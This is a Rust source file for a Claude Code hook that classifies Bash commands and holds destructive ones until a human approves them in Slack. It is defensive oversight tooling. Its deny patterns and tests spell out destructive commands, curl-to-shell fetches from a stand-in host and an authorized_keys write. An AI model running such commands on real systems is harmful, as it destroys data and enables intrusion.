//! `hcp hook`: the Claude Code hook. Register it for `PreToolUse`, `PostToolUse`,
//! `Notification` and `Stop`; it reads the event from stdin.
//!
//! Every Bash command falls into one of three tiers:
//!
//! - **safe** — read-only; passes silently.
//! - **notify** — ordinary work; a one-way notification is sent, nothing waits.
//! - **gate** — destructive or irreversible; blocks until a human approves it in Slack.
//!
//! How the answer reaches Claude Code: exit 0 lets the tool call continue through the normal
//! permission flow; exit 2 blocks it and stderr is given to Claude as the reason. Exit 2 is
//! only ever used for `PreToolUse` (on `Stop` it would mean "keep working").
//!
//! A gated command is blocked unless a human approved it. If HCP cannot be asked at all the
//! command is blocked too, unless `HCP_HOOK_ON_ERROR=allow`. Claude Code itself lets a tool
//! call through when a hook crashes or times out, so the settings entry should also set
//! `"onFailure": "block"` and a `timeout` longer than `HCP_HOOK_TIMEOUT`.

use std::io::Read;
use std::process::ExitCode;
use std::sync::LazyLock;
use std::time::Duration;

use regex::Regex;
use serde_json::{Value, json};

use crate::client::{AgentEnv, HcpClient, Waited};
use crate::domain::{CoordinationRequest, State};

/// How long a fire-and-forget notification may hold up the tool call it reports.
const NOTIFY_BUDGET: Duration = Duration::from_secs(3);
/// Largest tool input recorded verbatim in a notification (a `Write` carries the whole file).
const MAX_RECORDED_INPUT: usize = 20_000;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tier {
    Safe,
    Notify,
    Gate,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    /// Gate destructive commands; send nothing else.
    GateOnly,
    /// Gate destructive commands and send notifications for ordinary work.
    NotifyAndGate,
    /// Gate every Bash command that is not read-only.
    GateAll,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OnError {
    Block,
    Allow,
}

// ── Classifying Bash commands ───────────────────────────────────────────────

fn patterns(sources: &[&str]) -> Vec<Regex> {
    sources.iter().map(|source| Regex::new(source).expect("built-in pattern is valid")).collect()
}

/// Destructive, irreversible or high-impact. Searched for anywhere in the command, so a
/// harmless prefix (`echo ok && rm -rf build`) cannot hide one. Within a pattern, `[^;&|\n]*`
/// keeps a match inside one simple command.
static GATE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    patterns(&[
        r"\brm\s+(?:[^;&|\n]*\s)?(?:-[a-zA-Z]*[rRf][a-zA-Z]*\b|--recursive\b|--force\b)",
        r"\bgit\b(?:\s+-{1,2}\S+(?:\s+[^-\s]\S*)?)*\s+(?:push|reset\s+--hard|branch\s+-[Dd]|tag\s+-d)\b",
        // Recursive deletion by another name.
        r"\bfind\b[^;&|\n]*\s-delete\b",
        r"\bnpm\s+publish\b",
        r"(?i)\bdrop\s+(?:table|database|schema)\b",
        r"(?i)\btruncate\s+table\b",
        r"\bkubectl\b[^;&|\n]*\s(?:delete|apply|scale|rollout\s+restart)\b",
        r"\bterraform\b[^;&|\n]*\s(?:apply|destroy|force-unlock)\b",
        r"\baws\s[^;&|\n]*\s(?:delete|remove|terminate|destroy|deregister|rm|rb)\b",
        r"\bheroku\b[^;&|\n]*\b(?:destroy|delete)\b",
        r"\bchmod\s+(?:-R\s+)?[0-7]*7[0-7][0-7]\b",
        r"\bchown\s+-R\b",
        r"\bmkfs\b",
        r"\bdd\s+if=",
        r"\bsystemctl\s+(?:stop|disable|mask)\b",
        r"\bkill\s+-9\b",
        r"\bcrontab\s+-r\b",
        r">\s*/dev/(?:sd[a-z]|r?disk\d)",
        // The macOS counterparts of mkfs and systemctl.
        r"\bdiskutil\s+(?:erase\w*|partitionDisk|zeroDisk|randomDisk|secureErase|reformat)\b",
        r"\blaunchctl\s+(?:bootout|unload|disable|remove)\b",
    ])
});

/// Read-only commands. Each is matched against one simple command, from its start.
static SAFE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    patterns(&[
        r"^(?:ls|ll|la|l)\b",
        r"^(?:cat|head|tail|less|more|wc)\b",
        r"^(?:grep|rg|ag|ack)\b",
        r"^find\b",
        r"^(?:echo|printf|pwd|which|whereis|type)\b",
        // `env` alone prints the environment; `env CMD` runs CMD.
        r"^(?:env\s*$|printenv\b|export\s+-p\b)",
        r"^(?:ps|top|htop|pstree)\b",
        r"^git\s+(?:status|log|diff|show|branch|remote|tag|stash\s+list|ls-files)\b",
        r"^npm\s+(?:list|ls|outdated|audit)\b",
        r"^npx\s+tsc\s+--noEmit\b",
        r"^curl\s+.*(?:--head|-I)\b",
        r"^(?:date|cal|uptime|uname)\b",
        r"^(?:df|du|free|vmstat)\b",
    ])
});

/// Forms of otherwise read-only commands that write or execute.
static NOT_SAFE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    patterns(&[
        r"^find\b.*\s-(?:exec|execdir|ok|okdir|fprint\w*|fls)\b",
        r"^curl\b.*\s(?:-o|-O|--output|--remote-name|-T|--upload-file|-d|--data\S*|-F|--form|-X|--request)\b",
        r"^npm\s+audit\s+fix\b",
        r"^git\s+(?:log|diff|show)\b.*\s--output\b",
    ])
});

/// Redirections that discard output or merge streams; every other `>` writes a file.
static HARMLESS_REDIRECT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:[12&]?>\s*/dev/null|[12]?>&[12])").expect("built-in pattern is valid"));

static COMMAND_SEPARATOR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"&&|\|\||[;|&\n]").expect("built-in pattern is valid"));

/// Whether every part of a (possibly compound) command is read-only. Anything that could
/// write or run something else — a redirection to a file, command substitution, a part
/// that is not on the read-only list — makes the whole command not safe.
fn is_read_only(command: &str) -> bool {
    let command = HARMLESS_REDIRECT.replace_all(command, " ");
    if command.contains('>') || command.contains("$(") || command.contains('`') || command.contains("<(") {
        return false;
    }
    let mut parts = COMMAND_SEPARATOR.split(&command).map(str::trim).filter(|part| !part.is_empty()).peekable();
    parts.peek().is_some()
        && parts.all(|part| {
            SAFE.iter().any(|safe| safe.is_match(part))
                && !NOT_SAFE.iter().any(|unsafe_form| unsafe_form.is_match(part))
        })
}

pub fn bash_tier(command: &str) -> Tier {
    if GATE.iter().any(|pattern| pattern.is_match(command)) {
        Tier::Gate
    } else if is_read_only(command) {
        Tier::Safe
    } else {
        Tier::Notify
    }
}

// ── Deciding what an event calls for ────────────────────────────────────────

/// What the hook will do for one event. Computed without any I/O.
#[derive(Debug, PartialEq)]
pub enum Plan {
    /// Nothing to do: exit 0.
    Pass,
    /// Send a one-way notification, then exit 0.
    Notify { summary: String, metadata: Value },
    /// Ask a human and wait; exit 0 only if they approve.
    Gate { command: String, urgency: &'static str },
}

fn clip(text: &str, max_chars: usize) -> String {
    text.chars().take(max_chars).collect()
}

fn text<'a>(value: &'a Value, key: &str) -> &'a str {
    value.get(key).and_then(Value::as_str).unwrap_or_default()
}

fn tool_summary(tool: &str, input: &Value) -> String {
    match tool {
        "Bash" => format!("`{}`", clip(text(input, "command"), 120)),
        "Write" => format!("write {}", text(input, "file_path")),
        "Edit" | "MultiEdit" => format!("edit {}", text(input, "file_path")),
        "WebFetch" => format!("fetch {}", text(input, "url")),
        "WebSearch" => format!("search \"{}\"", text(input, "query")),
        other => other.to_string(),
    }
}

/// A tool input small enough to record, or a clipped preview of it.
fn recordable(input: &Value) -> Value {
    let serialized = input.to_string();
    if serialized.chars().count() <= MAX_RECORDED_INPUT {
        input.clone()
    } else {
        json!({ "truncated": true, "preview": clip(&serialized, MAX_RECORDED_INPUT) })
    }
}

pub fn plan(event: &Value, mode: Mode) -> Plan {
    let tool = text(event, "tool_name");
    let input = event.get("tool_input").cloned().unwrap_or(Value::Null);
    let notifying = mode != Mode::GateOnly;

    match text(event, "hook_event_name") {
        "PreToolUse" if tool == "Bash" => {
            let command = text(&input, "command").to_string();
            match bash_tier(&command) {
                Tier::Safe => Plan::Pass,
                Tier::Gate => Plan::Gate { command, urgency: "HIGH" },
                Tier::Notify if mode == Mode::GateAll => Plan::Gate { command, urgency: "MEDIUM" },
                Tier::Notify if notifying => Plan::Notify {
                    summary: format!("Running: `{}`", clip(&command, 200)),
                    metadata: json!({ "tool": "Bash", "command": clip(&command, MAX_RECORDED_INPUT) }),
                },
                Tier::Notify => Plan::Pass,
            }
        }
        "PreToolUse" if notifying && ["Write", "Edit", "MultiEdit", "WebFetch", "WebSearch"].contains(&tool) => {
            Plan::Notify {
                summary: tool_summary(tool, &input),
                metadata: json!({ "tool": tool, "input": recordable(&input) }),
            }
        }
        "PostToolUse" if notifying => {
            let significant = match tool {
                "Write" | "Edit" | "MultiEdit" => true,
                // A read-only command was not announced before it ran; do not announce it after.
                "Bash" => bash_tier(text(&input, "command")) != Tier::Safe,
                _ => false,
            };
            if !significant {
                return Plan::Pass;
            }
            let response = event.get("tool_response").or_else(|| event.get("tool_output"));
            let preview = match response {
                Some(Value::String(text)) => clip(text, 300),
                Some(other) => clip(&other.to_string(), 300),
                None => String::new(),
            };
            Plan::Notify {
                summary: format!("Completed {tool}: {}", tool_summary(tool, &input)),
                metadata: json!({ "tool": tool, "output_preview": preview }),
            }
        }
        "Notification" if notifying => Plan::Notify {
            summary: format!("Agent notification: {}", clip(text(event, "message"), 500)),
            metadata: json!({
                "source": "claude-code-notification",
                "notification_type": event.get("notification_type"),
            }),
        },
        "Stop" if notifying => {
            let last = clip(text(event, "last_assistant_message"), 300);
            let summary = if last.is_empty() {
                "Claude Code finished responding".to_string()
            } else {
                format!("Claude Code finished responding: {last}")
            };
            Plan::Notify { summary, metadata: json!({ "source": "claude-code-stop" }) }
        }
        _ => Plan::Pass,
    }
}

// ── Carrying the plan out ───────────────────────────────────────────────────

pub struct HookConfig {
    pub env: AgentEnv,
    /// How long a human has to answer a gated command.
    pub timeout_seconds: u64,
    pub mode: Mode,
    pub on_error: OnError,
}

impl HookConfig {
    pub fn from_env() -> Self {
        Self::from_lookup(|key| std::env::var(key).ok())
    }

    pub fn from_lookup(lookup: impl Fn(&str) -> Option<String>) -> Self {
        let get = |key: &str| lookup(key).map(|v| v.trim().to_lowercase()).filter(|v| !v.is_empty());
        let mode = match get("HCP_HOOK_MODE").as_deref() {
            None | Some("notify_and_gate") => Mode::NotifyAndGate,
            Some("gate_only") => Mode::GateOnly,
            Some("gate_all") => Mode::GateAll,
            Some(other) => {
                eprintln!("[hcp-hook] unknown HCP_HOOK_MODE {other:?}; using notify_and_gate");
                Mode::NotifyAndGate
            }
        };
        // Anything other than an explicit "allow" keeps the gate closed.
        let on_error = match get("HCP_HOOK_ON_ERROR").as_deref() {
            Some("allow") => OnError::Allow,
            _ => OnError::Block,
        };
        let timeout_seconds =
            get("HCP_HOOK_TIMEOUT").and_then(|raw| raw.parse::<u64>().ok()).filter(|s| *s > 0).unwrap_or(300);
        Self { env: AgentEnv::from_lookup(&lookup), timeout_seconds, mode, on_error }
    }
}

/// What the hook tells Claude Code.
#[derive(Debug, PartialEq)]
pub enum Verdict {
    Allow,
    Deny(String),
}

/// Where the request came from, attached to everything the hook sends.
fn session_fields(event: &Value, body: &mut Value) {
    let session = text(event, "session_id");
    if !session.is_empty() {
        body["trace_id"] = json!(session);
    }
    if let Some(metadata) = body.pointer_mut("/context_package/metadata").and_then(Value::as_object_mut) {
        for key in ["session_id", "cwd", "tool_use_id"] {
            if let Some(value) = event.get(key).filter(|value| value.is_string()) {
                metadata.insert(key.to_string(), value.clone());
            }
        }
    }
}

fn routing(env: &AgentEnv) -> Value {
    let mut hints = json!({ "responder_id": env.responder });
    if let Some(channel) = &env.slack_channel {
        hints["slack_channel_id"] = json!(channel);
    }
    hints
}

/// The decision a settled approval request amounts to.
pub fn verdict_for(cr: &CoordinationRequest, timeout_seconds: u64) -> Verdict {
    let by = cr.responded_by.as_deref().unwrap_or("a reviewer");
    let automatic = cr.response_data.as_ref().and_then(|d| d.get("auto")).and_then(Value::as_bool) == Some(true);
    let answered = matches!(cr.state, State::Delivered | State::Responded);
    let unapproved = "Do not attempt it another way without asking the user.";

    match (answered, cr.decision()) {
        (true, Some("approved")) if !automatic => Verdict::Allow,
        // An automatic approval is a timeout policy, not a person saying yes to this command.
        (true, Some("approved")) => {
            Verdict::Deny(format!("HCP: nobody reviewed this command within {timeout_seconds}s. {unapproved}"))
        }
        (true, Some("rejected")) if automatic => Verdict::Deny(format!(
            "HCP: nobody approved this command within {timeout_seconds}s, so it was rejected. {unapproved}"
        )),
        (true, _) => {
            let note = cr
                .response_data
                .as_ref()
                .and_then(|data| ["comment", "reason", "text"].iter().find_map(|key| data.get(key)?.as_str()))
                .map(|note| format!(" They said: {}", clip(note, 500)))
                .unwrap_or_default();
            Verdict::Deny(format!("HCP: a human reviewer ({by}) did not approve this command.{note} {unapproved}"))
        }
        (false, _) => {
            Verdict::Deny(format!("HCP: the approval request ended without a decision ({}). {unapproved}", cr.state))
        }
    }
}

async fn notify(client: &HcpClient, config: &HookConfig, event: &Value, summary: String, metadata: Value) {
    let mut body = json!({
        "intent": "NOTIFICATION",
        "urgency": "LOW",
        "context_package": { "summary": summary, "metadata": metadata },
        "timeout_policy": { "timeout_seconds": 3600, "fallback": "AUTO_APPROVE" },
        "routing_hints": routing(&config.env),
    });
    session_fields(event, &mut body);
    // Best effort: a notification must never hold up or fail the work it describes.
    let _ = tokio::time::timeout(NOTIFY_BUDGET, client.submit(&body)).await;
}

async fn gate(client: &HcpClient, config: &HookConfig, event: &Value, command: &str, urgency: &str) -> Verdict {
    let mut body = json!({
        "intent": "APPROVAL",
        "urgency": urgency,
        "context_package": {
            "summary": format!("Claude Code wants to run: `{}`", clip(command, 200)),
            "metadata": { "source": "claude-code-hook" },
        },
        "timeout_policy": { "timeout_seconds": config.timeout_seconds, "fallback": "AUTO_REJECT" },
        "routing_hints": routing(&config.env),
    });
    if command.chars().count() > 200 {
        body["context_package"]["detail"] = json!(command);
    }
    session_fields(event, &mut body);

    let submitted = match client.submit(&body).await {
        Ok(submitted) => submitted,
        Err(err) => return unavailable(config, &err.to_string()),
    };
    eprintln!("[hcp-hook] waiting for approval in Slack (request {})", submitted.request_id);

    match client.wait(submitted, config.env.poll).await {
        Ok(Waited::Settled(cr)) => {
            let verdict = verdict_for(&cr, config.timeout_seconds);
            if verdict == Verdict::Allow {
                eprintln!("[hcp-hook] approved by {}", cr.responded_by.as_deref().unwrap_or("a reviewer"));
            }
            verdict
        }
        Ok(Waited::Overdue(cr)) => verdict_for(&cr, config.timeout_seconds),
        // A human has been asked. Running the command without their answer is not an option,
        // whatever the error policy says about not being able to ask.
        Err(err) => Verdict::Deny(format!(
            "HCP: lost contact while waiting for approval ({err}). The command was not approved."
        )),
    }
}

/// The verdict for a gated command when HCP could not be asked at all.
fn unavailable(config: &HookConfig, why: &str) -> Verdict {
    match config.on_error {
        OnError::Block => Verdict::Deny(format!(
            "HCP: this command needs human approval, and approval could not be requested ({why}). \
             It was blocked. Do not attempt it another way without asking the user."
        )),
        OnError::Allow => {
            eprintln!("[hcp-hook] approval could not be requested ({why}); allowing because HCP_HOOK_ON_ERROR=allow");
            Verdict::Allow
        }
    }
}

pub async fn carry_out(plan: Plan, event: &Value, config: &HookConfig) -> Verdict {
    if plan == Plan::Pass {
        return Verdict::Allow;
    }
    let client =
        config.env.api_key.as_deref().ok_or_else(|| "HCP_API_KEY is not set".to_string()).and_then(|key| {
            HcpClient::new(&config.env.base_url, key, Duration::from_secs(10)).map_err(|e| e.to_string())
        });
    match (plan, client) {
        (Plan::Notify { summary, metadata }, Ok(client)) => {
            notify(&client, config, event, summary, metadata).await;
            Verdict::Allow
        }
        (Plan::Gate { command, urgency }, Ok(client)) => gate(&client, config, event, &command, urgency).await,
        (Plan::Gate { .. }, Err(why)) => unavailable(config, &why),
        // A notification that cannot be sent is dropped; nothing waits on it.
        (Plan::Notify { .. }, Err(_)) | (Plan::Pass, _) => Verdict::Allow,
    }
}

/// Entry point for `hcp hook`. `setup_error` is a problem found before the hook could
/// start (an unreadable `--env-file`, say); it is held to the same error policy as an
/// unreachable server rather than failing the process outright.
pub fn main(setup_error: Option<String>) -> ExitCode {
    let mut raw = String::new();
    let event: Value =
        match std::io::stdin().read_to_string(&mut raw).ok().and_then(|_| serde_json::from_str(&raw).ok()) {
            Some(event) => event,
            None => {
                // Not exit 2: the event is unknown, and on some events that means "keep going".
                // With `"onFailure": "block"` on the PreToolUse entry, Claude Code blocks on this.
                eprintln!("[hcp-hook] could not read the hook event from stdin");
                return ExitCode::from(1);
            }
        };
    let config = HookConfig::from_env();
    let plan = plan(&event, config.mode);
    let gating = matches!(plan, Plan::Gate { .. });

    if let Some(why) = setup_error {
        eprintln!("[hcp-hook] {why}");
        return match if gating { unavailable(&config, &why) } else { Verdict::Allow } {
            Verdict::Allow => ExitCode::SUCCESS,
            Verdict::Deny(reason) => {
                eprintln!("{reason}");
                ExitCode::from(2)
            }
        };
    }

    let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        let runtime = tokio::runtime::Builder::new_current_thread().enable_all().build().map_err(|e| e.to_string())?;
        crate::app::install_crypto_provider();
        Ok::<_, String>(runtime.block_on(carry_out(plan, &event, &config)))
    }));
    let verdict = match outcome {
        Ok(Ok(verdict)) => verdict,
        // The hook itself failed. Only a gated command is held to the error policy.
        Ok(Err(why)) if gating => unavailable(&config, &why),
        Err(_) if gating => unavailable(&config, "the hook crashed"),
        _ => Verdict::Allow,
    };
    match verdict {
        Verdict::Allow => ExitCode::SUCCESS,
        Verdict::Deny(reason) => {
            eprintln!("{reason}");
            ExitCode::from(2)
        }
    }
}

#[cfg(test)]
mod tests {
    use std::collections::HashMap;

    use super::*;

    #[test]
    fn read_only_commands_are_safe() {
        for command in [
            "ls -la",
            "cat README.md",
            "grep -rn TODO src",
            "git status",
            "git log --oneline -5",
            "git diff HEAD~1",
            "find . -name '*.rs'",
            "cat file | grep x | wc -l",
            "ls; pwd",
            "git status && git diff",
            "ls 2>/dev/null",
            "grep foo bar 2>&1 | head",
            "env",
            "npm ls",
            "curl -I https://example.com",
            "du -sh target",
        ] {
            assert_eq!(bash_tier(command), Tier::Safe, "{command}");
        }
    }

    #[test]
    fn destructive_commands_are_gated() {
        for command in [
            "rm -rf build",
            "rm -fr build",
            "rm -Rf build",
            "rm -r build",
            "rm -i -rf build",
            "rm --recursive build",
            "sudo rm -rf /var/x",
            "/bin/rm -f secrets.env",
            "git push",
            "git push --force origin main",
            "git -C /repo push",
            "git --no-pager push origin main",
            "git -c user.name=x push",
            "git reset --hard HEAD~3",
            "git branch -D feature",
            "git tag -d v1",
            "npm publish",
            "psql -c 'DROP TABLE users'",
            "psql -c 'truncate table users'",
            "kubectl delete pod x",
            "kubectl -n prod delete pod x",
            "kubectl rollout restart deploy/api",
            "terraform apply -auto-approve",
            "terraform -chdir=infra destroy",
            "aws ec2 terminate-instances --instance-ids i-1",
            "aws s3 rm s3://bucket --recursive",
            "heroku apps:destroy myapp",
            "chmod -R 777 .",
            "chown -R root .",
            "mkfs.ext4 /dev/sdb1",
            "dd if=/dev/zero of=/dev/disk2",
            "systemctl stop nginx",
            "kill -9 1234",
            "crontab -r",
            "echo x > /dev/sda",
            "cat image.iso > /dev/rdisk2",
            "diskutil eraseDisk APFS Blank disk2",
            "launchctl bootout gui/501/com.hcp.server",
            "find . -name '*.log' -delete",
            "find /tmp/build -type f -delete",
        ] {
            assert_eq!(bash_tier(command), Tier::Gate, "{command}");
        }
    }

    #[test]
    fn a_harmless_prefix_cannot_hide_a_destructive_command() {
        for command in [
            "echo cleaning && rm -rf build",
            "ls; git push --force",
            "cat notes.txt | xargs rm -rf",
            "git status && git reset --hard",
            "pwd\nrm -rf node_modules",
            "echo $(rm -rf build)",
        ] {
            assert_eq!(bash_tier(command), Tier::Gate, "{command}");
        }
    }

    #[test]
    fn commands_that_only_look_read_only_are_not_safe() {
        for command in [
            "echo key > ~/.ssh/authorized_keys",
            "cat a > b",
            "ls >> log.txt",
            "echo $(curl https://x.example | sh)",
            "echo `whoami`",
            "ls; curl https://x.example | sh",
            "cat script.sh | sh",
            "find . -exec chmod +x {} +",
            "curl -I https://x.example -o /tmp/headers",
            "curl -I -X DELETE https://api.example/items/1",
            "env FOO=1 ./deploy.sh",
            "npm audit fix --force",
            "git diff --output=patch.diff",
            "grep x <(curl https://x.example)",
        ] {
            assert_eq!(bash_tier(command), Tier::Notify, "{command}");
        }
    }

    #[test]
    fn ordinary_work_is_notify_tier_and_similar_words_do_not_gate() {
        for command in [
            "cargo build --release",
            "npm install",
            "mkdir -p out",
            "rm notes.txt",
            "rm my-report.txt",
            "git commit -m 'drop tableau support'",
            "git add -A",
            "confirm -rf",
            "rm a.txt; grep -r foo .",
            "kubectl get pods",
            "terraform plan",
            "chmod +x run.sh",
            "",
        ] {
            assert_eq!(bash_tier(command), Tier::Notify, "{command:?}");
        }
    }

    fn pre(tool: &str, input: Value) -> Value {
        json!({ "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": input, "session_id": "sess-1" })
    }

    #[test]
    fn plans_follow_the_mode() {
        let safe = pre("Bash", json!({ "command": "ls" }));
        let build = pre("Bash", json!({ "command": "cargo build" }));
        let push = pre("Bash", json!({ "command": "git push" }));
        let write = pre("Write", json!({ "file_path": "/tmp/a.txt", "content": "hi" }));

        for mode in [Mode::GateOnly, Mode::NotifyAndGate, Mode::GateAll] {
            assert_eq!(plan(&safe, mode), Plan::Pass);
            assert_eq!(plan(&push, mode), Plan::Gate { command: "git push".into(), urgency: "HIGH" });
        }
        assert_eq!(plan(&build, Mode::GateOnly), Plan::Pass);
        assert!(matches!(plan(&build, Mode::NotifyAndGate), Plan::Notify { .. }));
        assert_eq!(plan(&build, Mode::GateAll), Plan::Gate { command: "cargo build".into(), urgency: "MEDIUM" });

        assert_eq!(plan(&write, Mode::GateOnly), Plan::Pass);
        let Plan::Notify { summary, .. } = plan(&write, Mode::NotifyAndGate) else { panic!("expected a notification") };
        assert_eq!(summary, "write /tmp/a.txt");
    }

    #[test]
    fn other_events_notify_using_the_documented_fields() {
        let post = json!({
            "hook_event_name": "PostToolUse", "tool_name": "Bash",
            "tool_input": { "command": "cargo test" }, "tool_response": { "stdout": "ok" },
        });
        let Plan::Notify { summary, metadata } = plan(&post, Mode::NotifyAndGate) else { panic!() };
        assert_eq!(summary, "Completed Bash: `cargo test`");
        assert_eq!(metadata["output_preview"], "{\"stdout\":\"ok\"}");

        let quiet = json!({ "hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": { "command": "ls" } });
        assert_eq!(plan(&quiet, Mode::NotifyAndGate), Plan::Pass);
        let read = json!({ "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {} });
        assert_eq!(plan(&read, Mode::NotifyAndGate), Plan::Pass);

        let stop = json!({ "hook_event_name": "Stop", "last_assistant_message": "All done." });
        let Plan::Notify { summary, .. } = plan(&stop, Mode::NotifyAndGate) else { panic!() };
        assert_eq!(summary, "Claude Code finished responding: All done.");
        assert_eq!(plan(&stop, Mode::GateOnly), Plan::Pass);

        let note =
            json!({ "hook_event_name": "Notification", "message": "Needs input", "notification_type": "idle_prompt" });
        let Plan::Notify { summary, metadata } = plan(&note, Mode::NotifyAndGate) else { panic!() };
        assert_eq!(
            (summary.as_str(), &metadata["notification_type"]),
            ("Agent notification: Needs input", &json!("idle_prompt"))
        );

        assert_eq!(plan(&json!({ "hook_event_name": "SessionStart" }), Mode::GateAll), Plan::Pass);
        assert_eq!(plan(&json!({}), Mode::GateAll), Plan::Pass);
    }

    #[test]
    fn large_tool_inputs_are_recorded_as_a_preview() {
        let small = json!({ "file_path": "a", "content": "x" });
        assert_eq!(recordable(&small), small);
        let large = recordable(&json!({ "content": "x".repeat(50_000) }));
        assert_eq!(large["truncated"], true);
        assert_eq!(large["preview"].as_str().unwrap().chars().count(), MAX_RECORDED_INPUT);
    }

    #[test]
    fn requests_carry_the_session_and_working_directory() {
        let event = json!({ "session_id": "sess-1", "cwd": "/repo", "tool_use_id": "toolu_1" });
        let mut body = json!({ "context_package": { "summary": "s", "metadata": { "source": "x" } } });
        session_fields(&event, &mut body);
        assert_eq!(body["trace_id"], "sess-1");
        assert_eq!(
            body["context_package"]["metadata"],
            json!({
                "source": "x", "session_id": "sess-1", "cwd": "/repo", "tool_use_id": "toolu_1",
            })
        );
    }

    fn config(pairs: &[(&str, &str)]) -> HookConfig {
        let map: HashMap<String, String> = pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
        HookConfig::from_lookup(|key| map.get(key).cloned())
    }

    #[test]
    fn the_gate_fails_closed_unless_told_otherwise() {
        let default = config(&[]);
        assert_eq!(
            (default.mode, default.on_error, default.timeout_seconds),
            (Mode::NotifyAndGate, OnError::Block, 300)
        );
        assert!(
            matches!(unavailable(&default, "connection refused"), Verdict::Deny(reason) if reason.contains("connection refused"))
        );

        assert_eq!(config(&[("HCP_HOOK_ON_ERROR", "ALLOW")]).on_error, OnError::Allow);
        assert_eq!(config(&[("HCP_HOOK_ON_ERROR", "maybe")]).on_error, OnError::Block);
        assert_eq!(config(&[("HCP_HOOK_MODE", "gate_all"), ("HCP_HOOK_TIMEOUT", "60")]).mode, Mode::GateAll);
        assert_eq!(config(&[("HCP_HOOK_TIMEOUT", "0")]).timeout_seconds, 300);
        assert_eq!(config(&[("HCP_HOOK_MODE", "nonsense")]).mode, Mode::NotifyAndGate);
    }

    #[test]
    fn only_a_human_approval_allows_the_command() {
        use crate::domain::Intent;
        let mut cr = crate::slack::tests::request(Intent::Approval);
        let denied = |cr: &CoordinationRequest| matches!(verdict_for(cr, 300), Verdict::Deny(_));

        cr.state = State::Delivered;
        cr.responded_by = Some("slack:isaac".to_string());
        cr.response_data = Some(json!({ "decision": "approved" }));
        assert_eq!(verdict_for(&cr, 300), Verdict::Allow);

        cr.response_data = Some(json!({ "decision": "rejected", "comment": "not on a Friday" }));
        let Verdict::Deny(reason) = verdict_for(&cr, 300) else { panic!() };
        assert!(reason.contains("slack:isaac") && reason.contains("not on a Friday"));

        cr.response_data = Some(json!({ "decision": "rejected", "auto": true }));
        assert!(matches!(verdict_for(&cr, 300), Verdict::Deny(reason) if reason.contains("within 300s")));
        // Even if the request's fallback approved it, nobody looked at this command.
        cr.response_data = Some(json!({ "decision": "approved", "auto": true }));
        assert!(denied(&cr));
        cr.response_data = Some(json!({ "text": "sure" }));
        assert!(denied(&cr));

        for state in [State::TimedOut, State::Cancelled, State::PendingResponse, State::Routing] {
            cr.state = state;
            cr.response_data = Some(json!({ "decision": "approved" }));
            assert!(denied(&cr), "{state}");
        }
    }
}
